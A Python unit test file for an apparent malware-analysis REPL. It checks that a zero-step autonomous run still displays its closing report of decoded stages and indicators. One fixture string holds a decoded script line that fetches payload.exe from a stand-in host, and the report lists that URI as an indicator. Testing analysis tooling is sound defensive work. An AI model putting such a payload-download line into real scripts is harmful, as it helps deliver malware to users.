"""A zero-step autonomous run that closed with a report shows the report.

The seam: `Repl._ask_analysis` treated "no step completed" as "nothing to
render" and printed only the stop reason. That was right for a cancelled or
failed run, and wrong for the run these tests pin -- a plan that was empty
twice executes no action, so `steps` is empty, yet the runtime still closes
with a report, and when the deterministic preflight decoded a stage that
report carries the decoded body and the indicators found in it. Dropping it
showed the analyst "no open question requires an action" and nothing else,
for an artifact whose payload and C2 the runtime had already recovered.
"""
from __future__ import annotations

import contextlib
import io
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from orbit.backend.base import ChatResult, Message  # noqa: E402
from orbit.runtime import ChatRuntime  # noqa: E402
from orbit.runtime.analysis_runtime import (  # noqa: E402
    STOP_LEDGER_EXHAUSTED,
    AnalysisReport,
    AutonomousRunResult,
)
from orbit.terminal.config import AppConfig  # noqa: E402
from orbit.terminal.repl import Repl  # noqa: E402

DECODED = "Object.Open(\"GET\", \"https://example.invalid/payload.exe\", false);"
REPORT_TEXT = (
    "No investigative action ran, but the runtime recovered 1 deterministic "
    "transformation(s) from the artifact.\n\n## Verified indicators\n\n"
    f"- uri: https://example.invalid/payload.exe\n\n## Deterministic transformations\n\n{DECODED}"
)


class _Backend:
    thinking = False

    def chat(self, messages: list[Message], *, temperature: float, max_tokens: int, tools=None) -> ChatResult:
        raise AssertionError("the REPL must not call the chat backend here")

    def server_tools(self):
        return []


class _Analysis:
    """The runtime as `_ask_analysis` sees it: history, turns, one run."""

    def __init__(self, result: AutonomousRunResult) -> None:
        self.messages: list[dict] = []
        self.analyst_turns = 0
        self.result = result
        self.calls: list[str] = []

    def run_autonomous(self, analyst_message, **kwargs):
        # A deliberately hybrid shape. The history half models a run that
        # went through source coverage (the source turn and the reply are in
        # the history when the report is produced); the report half is the
        # deterministic-only text, which the real runtime produces on the
        # UNCOVERED path. Each half is what its test asserts on; no single
        # real run has both. (On the pure empty-plan path nothing is
        # appended, so there is nothing to rewind either way.)
        self.messages.append({"role": "user", "content": analyst_message})
        self.messages.append({"role": "assistant", "content": "covered"})
        self.analyst_turns += 1
        self.calls.append(analyst_message)
        return self.result

    def deterministic_sections(self) -> str:
        return ""


def _zero_step(final_report: AnalysisReport | None) -> AutonomousRunResult:
    return AutonomousRunResult(
        steps=(), progress=(), stop_reason=STOP_LEDGER_EXHAUSTED, model_calls=2,
        actions_executed=0, plan_calls=2, final_report=final_report,
    )


def _repl(result: AutonomousRunResult) -> tuple[Repl, _Analysis]:
    backend = _Backend()
    repl = Repl(
        runtime=ChatRuntime(backend=backend, system_prompt=None),
        backend=backend,
        config=AppConfig(workdir=Path(".")),
        autonomous_analysis=True,
    )
    analysis = _Analysis(result)
    repl.analysis = analysis
    return repl, analysis


def _run(repl: Repl, message: str) -> str:
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
        repl._ask_analysis(message)
    return out.getvalue()


class ZeroStepReportTests(unittest.TestCase):
    def test_the_closing_report_is_rendered_when_no_step_ran(self) -> None:
        repl, _ = _repl(_zero_step(AnalysisReport(text=REPORT_TEXT, model_calls=0)))
        output = _run(repl, "Analyse this artifact.")
        self.assertIn("https://example.invalid/payload.exe", output)
        self.assertIn(DECODED, output)

    def test_the_summary_still_names_the_stop_reason_and_counts(self) -> None:
        repl, _ = _repl(_zero_step(AnalysisReport(text=REPORT_TEXT, model_calls=0)))
        output = _run(repl, "Analyse this artifact.")
        self.assertIn(f"stopped: {STOP_LEDGER_EXHAUSTED}", output)
        self.assertIn("actions: 0", output)
        self.assertIn("model calls: 2", output)

    def test_the_report_is_not_reduced_to_the_stop_reason(self) -> None:
        """The exact symptom: only the stop reason was shown."""
        repl, _ = _repl(_zero_step(AnalysisReport(text=REPORT_TEXT, model_calls=0)))
        output = _run(repl, "Analyse this artifact.")
        visible = [line for line in output.splitlines() if line.strip()]
        self.assertGreater(len(visible), 1)
        self.assertTrue(any(DECODED in line for line in visible))

    def test_a_reported_run_keeps_what_it_appended_to_history(self) -> None:
        """The report answers those turns; rewinding them would orphan it."""
        repl, analysis = _repl(_zero_step(AnalysisReport(text=REPORT_TEXT, model_calls=0)))
        _run(repl, "Analyse this artifact.")
        self.assertEqual(len(analysis.messages), 2)
        self.assertEqual(analysis.analyst_turns, 1)

    def test_a_zero_step_run_without_a_report_still_prints_only_the_stop_reason(self) -> None:
        """Today's behaviour for a cancelled/failed/zero-budget run is kept."""
        repl, analysis = _repl(_zero_step(None))
        output = _run(repl, "Analyse this artifact.")
        self.assertIn(STOP_LEDGER_EXHAUSTED, output)
        self.assertNotIn("analysis | mode: ANALYSIS", output)
        # And the turn that produced nothing is undone, as before.
        self.assertEqual(analysis.messages, [])
        self.assertEqual(analysis.analyst_turns, 0)

    def test_a_cancelled_zero_step_run_is_reported_as_cancelled(self) -> None:
        result = AutonomousRunResult(
            steps=(), progress=(), stop_reason="cancelled by analyst", model_calls=1,
            actions_executed=0, cancelled=True, final_report=None,
        )
        repl, _ = _repl(result)
        output = _run(repl, "Analyse this artifact.")
        self.assertIn("cancelled", output)
        self.assertNotIn("analysis | mode: ANALYSIS", output)


if __name__ == "__main__":
    unittest.main()
